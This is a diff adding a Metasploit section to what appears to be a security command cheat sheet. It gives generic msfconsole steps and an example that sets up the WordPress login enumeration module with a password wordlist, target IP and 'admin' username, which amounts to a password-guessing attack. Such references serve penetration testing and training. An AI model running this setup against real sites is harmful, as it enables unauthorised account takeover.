@@ -254,6 +254,31 @@ tcp.flags.syn == 1
 http.request.method == POST
 ```
 
+## _metasploit_
+
+```sh
+# start metasploit
+msfconsole
+# search for the exploit
+search <exploit_name>
+# use the exploit
+use <exploit_name>
+# show options
+show options
+# set the target
+set RHOST <target_ip>
+# run the exploit
+run
+# example
+use auxilliary/scanner/http/wordpress_login_enum
+show options
+set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+set RHOSTS 10.10.10.10  (target ip)
+set RPORT 8080          (target port)
+set TARGETURI http://10.10.10.10:8080/
+set USERNAME admin
+```
+
 ## _others_
 
 ```sh
